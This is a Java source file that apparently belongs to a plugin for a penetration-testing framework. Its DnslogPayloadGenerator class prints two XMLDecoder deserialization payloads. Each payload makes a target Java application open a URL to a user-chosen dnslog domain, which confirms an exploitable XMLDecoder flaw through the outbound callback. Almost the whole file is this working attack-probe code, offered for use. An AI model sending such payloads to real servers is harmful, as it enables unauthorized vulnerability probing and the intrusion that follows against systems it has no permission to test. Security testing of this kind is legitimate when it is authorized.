package me.gv7.woodpecker.plugin.payloads;

import me.gv7.woodpecker.plugin.*;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class DnslogPayloadGenerator implements IHelper {

    public String getHelperTabCaption() {
        return "dnslog";
    }

    public IArgsUsageBinder getHelperCutomArgs() {
        IArgsUsageBinder argsUsageBinder = XMLDecoderPlugin.pluginHelper.createArgsUsageBinder();
        List<IArg> args = new ArrayList<IArg>();
        IArg args1 = XMLDecoderPlugin.pluginHelper.createArg();
        args1.setName("dnslog_domain");
        args1.setDefaultValue("test.dnslog.com");
        args1.setDescription("dnslog域名");
        args1.setRequired(true);
        args.add(args1);
        argsUsageBinder.setArgsList(args);
        return argsUsageBinder;
    }

    public void doHelp(Map<String, Object> customArgs, IResultOutput resultOutput) throws Throwable {
        String dnslog_domain = (String)customArgs.get("dnslog_domain");
        resultOutput.successPrintln("Payload1:");
        String payload = String.format("<java>\n" +
                "    <new class=\"java.net.URL\">\n" +
                "        <string>http://%s</string>\n" +
                "        <void method=\"getContent\"/>\n" +
                "    </new>\n" +
                "</java>",dnslog_domain);

        resultOutput.rawPrintln("\n" + payload + "\n");
        resultOutput.successPrintln("Payload2:");
        payload = String.format("<java>\n" +
                "    <new class=\"java.util.HashMap\">\n" +
                "        <void method=\"put\">\n" +
                "            <new class=\"java.net.URL\">\n" +
                "                <string>http://%s</string>\n" +
                "            </new>\n" +
                "            <string>x</string>\n" +
                "        </void>\n" +
                "    </new>\n" +
                "</java>",dnslog_domain);
        resultOutput.rawPrintln("\n" + payload + "\n");
    }
}
